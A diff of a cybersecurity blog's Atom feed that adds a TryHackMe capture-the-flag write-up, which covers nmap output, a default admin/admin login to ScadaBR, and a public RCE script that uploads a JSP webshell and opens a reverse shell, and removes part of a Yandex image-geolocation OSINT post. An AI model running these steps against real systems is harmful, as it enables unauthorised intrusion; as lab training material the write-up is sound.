@@ -1,4 +1,240 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-27T17:42:52-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Breach Tryhackme</title><link href="http://localhost:4000/blog/BreachTryhackme/" rel="alternate" type="text/html" title="Breach Tryhackme" /><published>2025-06-27T00:00:00-04:00</published><updated>2025-06-27T00:00:00-04:00</updated><id>http://localhost:4000/blog/Breach</id><content type="html" xml:base="http://localhost:4000/blog/BreachTryhackme/"><![CDATA[<h2 id="initial-recon-nmap-full-port-and-version-scan">Initial Recon: Nmap Full Port and Version Scan</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-28T14:13:06-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Brr v1 Tryhackme</title><link href="http://localhost:4000/blog/Brrv1Tryhackme/" rel="alternate" type="text/html" title="Brr v1 Tryhackme" /><published>2025-06-28T00:00:00-04:00</published><updated>2025-06-28T00:00:00-04:00</updated><id>http://localhost:4000/blog/%20BrrV1</id><content type="html" xml:base="http://localhost:4000/blog/Brrv1Tryhackme/"><![CDATA[<h2 id="initial-reconnaissance">Initial Reconnaissance</h2>
+
+<p>Because this was a web exploitation challenge, I immediately went to the IP in the browser. At the same time, I ran an nmap scan. While nmap was running, I checked the URL.</p>
+
+<p>When you visit the IP, it shows something like this:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+Error response
+Error code: 405
+Message: Method Not Allowed
+Error code explanation: 405 - Specified method is invalid for this resource.
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*jur2DGUirykMQMQEI3CfVQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>I tried changing the HTTP method to different ones but had no luck. So I waited for the nmap scan to finish.</p>
+
+<h2 id="port-discovery-and-initial-access">Port Discovery and Initial Access</h2>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 c8:3a:84:31:2e:4e:fa:a2:7f:4c:29:4c:ff:00:37:34 (ECDSA)
+|_  256 b2:b8:77:4b:41:c2:18:19:5e:aa:52:13:22:51:7e:9e (ED25519)
+80/tcp   open  http    WebSockify Python/3.12.3
+|_http-server-header: WebSockify Python/3.12.3
+|_http-title: Error response
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 405 Method Not Allowed
+|     Server: WebSockify Python/3.12.3
+|     Date: Sat, 28 Jun 2025 17:19:29 GMT
+|     Connection: close
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 355
+|     &lt;!DOCTYPE HTML&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 405&lt;/p&gt;
+|     &lt;p&gt;Message: Method Not Allowed.&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: 405 - Specified method is invalid for this resource.&lt;/p&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 501 Unsupported method ('OPTIONS')
+|     Server: WebSockify Python/3.12.3
+|     Date: Sat, 28 Jun 2025 17:19:30 GMT
+|     Connection: close
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 360
+|     &lt;!DOCTYPE HTML&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 501&lt;/p&gt;
+|     &lt;p&gt;Message: Unsupported method ('OPTIONS').&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: 501 - Server does not support this operation.&lt;/p&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   RTSPRequest: 
+|     &lt;!DOCTYPE HTML&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 400&lt;/p&gt;
+|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+5901/tcp open  vnc     VNC (protocol 3.8)
+| vnc-info: 
+|   Protocol version: 3.8
+|   Security types: 
+|     VeNCrypt (19)
+|     VNC Authentication (2)
+|   VeNCrypt auth subtypes: 
+|     Unknown security type (2)
+|_    VNC auth, Anonymous TLS (258)
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: ScadaBR CTF
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+</code></pre>
+</div>
+
+<p>The scan revealed port 8080 open, which is running Tomcat. Visiting <code class="language-plaintext highlighter-rouge">http://ip:8080/</code> redirected me to <code class="language-plaintext highlighter-rouge">/ScadaBR/</code> with a login prompt.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*PsBmqK1F0XOhHyhIS5DYZA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*eIW4KVXVgoCjeZWIm-o-fQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Based on the name ScadaBR, I searched for exploits using searchsploit ScadaBR. It showed two different exploits, one for Windows and one for Linux.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*CeZqkeDIqBKSUfSJXrKKPg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Both require authentication to work, so I started trying to brute-force directories to find hidden files that might contain usernames, but came up empty. I decided to try default credentials, <code class="language-plaintext highlighter-rouge">admin/admin</code>, and bingo login successful.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*v5jVD7q5IUTJjXYaeXXc4A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Once logged in, I used the Linux exploit script. Running it with <code class="language-plaintext highlighter-rouge">-h</code> showed how it works:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+python3 LinScada_RCE.py -h
+[x] Missing arguments ...
+[&gt;] Usage: python LinScada_RCE.py &lt;TargetIp&gt; &lt;TargetPort&gt; &lt;User&gt; &lt;Password&gt; &lt;Reverse_IP&gt; &lt;Reverse_Port&gt;
+[&gt;] Example: python LinScada_RCE.py 192.168.1.24 8080 admin admin 192.168.1.50 4444
+</code></pre>
+</div>
+
+<p>Next, I set up a reverse shell listener</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*rKMDF2rd1KSAQVenbcxbzA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>and ran the exploit:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+
+python3 exploitscada.py 10.10.133.164 8080 admin admin 10.13.87.60 4444
+
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*gvl1nb-Du3R1Zp4oJkjqEw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*X_SMxtcV05ZULDIJ4HhnGg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p><strong>Output:</strong></p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+[+] Trying to authenticate http://10.10.133.164:8080/ScadaBR/login.htm...
+[+] Successfully authenticated! :D~
+[&gt;] Attempting to upload .jsp Webshell...
+[&gt;] Verifying shell upload...
+[+] Upload Successful!
+[+] Webshell Found at: http://10.10.133.164:8080/ScadaBR/uploads/1.jsp
+[&gt;] Spawning Reverse Shell...
+[+] Connection received
+</code></pre>
+</div>
+
+<h2 id="post-exploitation">Post-Exploitation</h2>
+
+<p>I checked the reverse shell and ran <code class="language-plaintext highlighter-rouge">whoami</code> to confirm, which returned user <code class="language-plaintext highlighter-rouge">tomcat</code>.</p>
+
+<p>Running <code class="language-plaintext highlighter-rouge">ls</code> showed the file <code class="language-plaintext highlighter-rouge">root.txt</code>. I then read <code class="language-plaintext highlighter-rouge">root.txt</code> and got the flag.</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+whoami
+# tomcat
+
+ls
+# root.txt
+
+cat root.txt
+# [FLAG_CONTENT]
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*PjDYSbPmL0Ijyrk5GxZjnA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<h2 id="summary">Summary</h2>
+
+<p>This challenge demonstrated:</p>
+<ul>
+  <li>Port enumeration and service identification</li>
+  <li>Default credential exploitation</li>
+  <li>ScadaBR vulnerability exploitation</li>
+  <li>Reverse shell payload delivery</li>
+  <li>Direct privilege escalation to root access</li>
+</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="Redteam" /><category term="pentesting" /><category term="bugbounty" /><category term="ctf" /><summary type="html"><![CDATA[Initial Reconnaissance]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://img.freepik.com/premium-photo/serene-eerie-depiction-dark-throne-room-with-red-flames_908344-67404.jpg" /><media:content medium="image" url="https://img.freepik.com/premium-photo/serene-eerie-depiction-dark-throne-room-with-red-flames_908344-67404.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Breach Tryhackme</title><link href="http://localhost:4000/blog/BreachTryhackme/" rel="alternate" type="text/html" title="Breach Tryhackme" /><published>2025-06-27T00:00:00-04:00</published><updated>2025-06-27T00:00:00-04:00</updated><id>http://localhost:4000/blog/Breach</id><content type="html" xml:base="http://localhost:4000/blog/BreachTryhackme/"><![CDATA[<h2 id="initial-recon-nmap-full-port-and-version-scan">Initial Recon: Nmap Full Port and Version Scan</h2>
 
 <div class="code-block-container">
   <span class="code-lang-tag">Terminal</span>
@@ -6082,140 +6318,4 @@ SELECT id, ip, user_agent, note FROM logins WHERE user_agent = '' UNION SELECT i
   </li>
 </ul>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Cky9Qb2di_0LlpwaJ6B8Pg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[SQL (Structured Query Language) SQL is a powerful language used to interact with relational databases. It lets you fetch, update, insert, and remove data using clear commands called statements.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e1.pxfuel.com/desktop-wallpaper/226/223/desktop-wallpaper-dark-art-artwork-fantasy-artistic-original-psychedelic-horror-evil-creepy-scary-spooky-halloween-evil-dark-winter.jpg" /><media:content medium="image" url="https://e1.pxfuel.com/desktop-wallpaper/226/223/desktop-wallpaper-dark-art-artwork-fantasy-artistic-original-psychedelic-horror-evil-creepy-scary-spooky-halloween-evil-dark-winter.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Yandex’s AI-Powered Reverse Image Search</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/yandex.html" rel="alternate" type="text/html" title="Yandex’s AI-Powered Reverse Image Search" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/yandex</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/yandex.html"><![CDATA[<p>Yandex, Russia’s search titan, supercharges its reverse image search with AI, creating a powerful tool that goes way beyond pixel matching. Understanding this tech is critical for anyone playing offense or defense in the cyber game.</p>
-
-<h2 id="how-yandex-uses-ai-for-reverse-image-search">How Yandex Uses AI for Reverse Image Search</h2>
-
-<p>Traditional reverse image search engines rely mostly on hashing and pixel-by-pixel comparison, which falls apart when images are edited, cropped, or compressed. Yandex flips the script with deep learning models primarily convolutional neural networks (CNNs) that analyze images on multiple layers:</p>
-
-<ul>
-  <li>
-    <p><strong>Feature Extraction:</strong> The AI pulls out low-level features edges, textures, colors and higher-level objects inside the image, such as faces, logos, or landmarks.</p>
-  </li>
-  <li>
-    <p><strong>Semantic Understanding:</strong> By training on massive datasets, the AI “understands” what the image represents, recognizing objects or scenes regardless of size or orientation.</p>
-  </li>
-  <li>
-    <p><strong>Contextual Matching:</strong> Instead of just searching for exact copies, Yandex’s system finds visually similar images even if they are altered or taken from different angles.</p>
-  </li>
-</ul>
-
-<p>This layered approach lets Yandex find not just identical images but also variants, edits, or related visuals, providing a richer set of results.</p>
-
-<h2 id="offensive-cybersecurity-implications">Offensive Cybersecurity Implications</h2>
-
-<p>For red teamers and bug hunters, Yandex’s AI reverse search is a goldmine for reconnaissance:</p>
-
-<ul>
-  <li>
-    <p><strong>Image Footprinting:</strong> Drop a single photo of a target or asset into Yandex. The AI can pull up related images, social media profiles, or other digital footprints you didn’t even know existed.</p>
-  </li>
-  <li>
-    <p><strong>Social Engineering Prep:</strong> Visual context from related images can reveal habits, locations, or colleagues to exploit in targeted phishing or physical infiltration.</p>
-  </li>
-  <li>
-    <p><strong>Data Leak Discovery:</strong> Search leaked or stolen images on underground forums or paste sites that may have been altered, cropped, or watermarked AI-powered search spots them regardless.</p>
-  </li>
-</ul>
-
-<p>But tread carefully using AI image search during ops can leave digital fingerprints. Smart defenders monitor these queries and can trace them back if OPSEC slips.</p>
-
-<h2 id="defensive-strategies-against-ai-image-recon">Defensive Strategies Against AI Image Recon</h2>
-
-<p>If you’re defending high-value targets, here’s how to blunt Yandex’s AI-powered visual scraping:</p>
-
-<ul>
-  <li>
-    <p><strong>Metadata &amp; Image Sanitization:</strong> Strip EXIF data and avoid posting high-res, unique images publicly.</p>
-  </li>
-  <li>
-    <p><strong>Image Variants:</strong> Use watermarks or slightly alter publicly available images to throw off AI pattern recognition.</p>
-  </li>
-  <li>
-    <p><strong>Monitor Visual Threats:</strong> Deploy your own AI-powered monitoring to catch when images of your assets or personnel surface unexpectedly online.</p>
-  </li>
-  <li>
-    <p><strong>OPSEC Training:</strong> Educate personnel about the risks of sharing identifiable photos on social media or public channels.</p>
-  </li>
-</ul>
-
-<h2 id="the-future-ai-and-visual-data-warfare">The Future: AI and Visual Data Warfare</h2>
-
-<p>Yandex’s AI reverse search is just the beginning. As neural networks get smarter and more integrated with multimodal data combining text, voice, and video your digital footprint shrinks less and less.</p>
-
-<h2 id="a-different-scenario">A Different Scenario</h2>
-
-<p>Now, let’s explore a different scenario where AI-powered reverse image search could have a major impact.</p>
-
-<p><strong>Image 1:</strong></p>
-
-<div class="alert-error">
-Click any image to view it in full screen.
-</div>
-
-<p>Where in the world is image 1? The answer is the country name?</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*pMTMuYyTbfDUObXit-k-Jg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*N01HOh0EdaD6F_TiEeHeHw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>If we navigate to <a href="https://yandex.com">yandex.com</a> and upload the image to the search bar, Yandex will display a variety of related pictures. By examining the first Wikipedia link in the results, we can quickly determine that the image is from China.</p>
-
-<hr />
-
-<p><strong>Image 2:</strong></p>
-
-<p>In this case, the question is: Where was image 2 taken? Specifically, we’re looking for the name of the place that likely set up the webcam. The answer should become clear as you investigate!</p>
-
-<p>I started by using Yandex to see if I could pinpoint the location or at least find the name of the place.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*YTyoeIPrKIIq2P_cTEIltA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Since the question asks for “the name of the place,” I focused on any clues in the images. One of the results showed a crime report, so I decided to investigate that further to see if it revealed an address.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*I8LR2TSQTI4qYzNwoCx-VQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*nZwsHM4N3tDSwqR4jWAa5g.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Once I found an address, I searched for it on Google.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*9X8IN8qi-cHYWWnJvm7jWA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>At first glance, the area looked different compared to the image (this is from 2016)</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*6mDaSpKAMmbCYJReMABFew.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>but after moving around in Street View, I found a matching view from 2021.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Lt8sjDZxCTLnStI4PMfhZw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>This allowed me to confirm the camera position and spot the store, Wrigleyville Sports.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DYzeACYBop2r1RoFp4hN4w.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<div class="alert-warning">
-<strong>Important Note:</strong> When geolocating an image, we want to point out big landmarks we can easily find on a map. Road layouts, business names, The Empire States Building.
-</div>
-
-<p><strong>Mastering Geolocation: Reading the World Like a Map</strong></p>
-
-<p>To excel at geolocation, you’ve got to see what others miss. It’s not just about what <em>is</em> in the image it’s also about what <em>isn’t</em>. For example, spotting a Catholic church in a predominantly Buddhist or Islamic country? Unlikely. That kind of cultural mismatch is a red flag or a clue.</p>
-
-<p>Language is another major signal. Signs on shops, billboards, text on vehicles snap a screenshot, run it through Google Translate, and you’ve already narrowed the region.</p>
-
-<p>Traffic flow matters too. Which side of the road are the cars on? What do the license plates look like shape, color, characters? Road markings vary wildly between countries, and so do traffic light styles.</p>
-
-<p>Even people are clues. Clothing choices can hint at climate and culture. Coats in June? Could be Norway. Tank tops in December? Maybe Australia.</p>
-
-<p>Details matter. The smallest cues power lines, curb styles, storefront architecture can give away a location. Train your brain to see patterns most overlook.</p>
-
-<p>Then, there’s digital metadata. Check if the image has EXIF data embedded it can hold GPS coordinates, device info, and timestamps. If the image was pulled from social media, see if there’s a geotag or a location hint in the caption or comments.</p>
-
-<p>Geolocation isn’t just visual. It’s forensic. Pattern-based. Contextual. The more inputs you analyze, the tighter your triangulation.</p>
-
-<hr />
-<p><strong>Further Reading:</strong></p>
-
-<ul>
-  <li><a href="https://www.bellingcat.com/resources/how-tos/2019/12/26/guide-to-using-reverse-image-search-for-investigations/">Guide to Using Reverse Image Search for Investigations (Bellingcat)</a></li>
-</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[Yandex, Russia’s search titan, supercharges its reverse image search with AI, creating a powerful tool that goes way beyond pixel matching. Understanding this tech is critical for anyone playing offense or defense in the cyber game.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e0.pxfuel.com/wallpapers/792/989/desktop-wallpaper-badass-grim-reaper-realistic-grim-reaper.jpg" /><media:content medium="image" url="https://e0.pxfuel.com/wallpapers/792/989/desktop-wallpaper-badass-grim-reaper-realistic-grim-reaper.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Cky9Qb2di_0LlpwaJ6B8Pg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[SQL (Structured Query Language) SQL is a powerful language used to interact with relational databases. It lets you fetch, update, insert, and remove data using clear commands called statements.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e1.pxfuel.com/desktop-wallpaper/226/223/desktop-wallpaper-dark-art-artwork-fantasy-artistic-original-psychedelic-horror-evil-creepy-scary-spooky-halloween-evil-dark-winter.jpg" /><media:content medium="image" url="https://e1.pxfuel.com/desktop-wallpaper/226/223/desktop-wallpaper-dark-art-artwork-fantasy-artistic-original-psychedelic-horror-evil-creepy-scary-spooky-halloween-evil-dark-winter.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
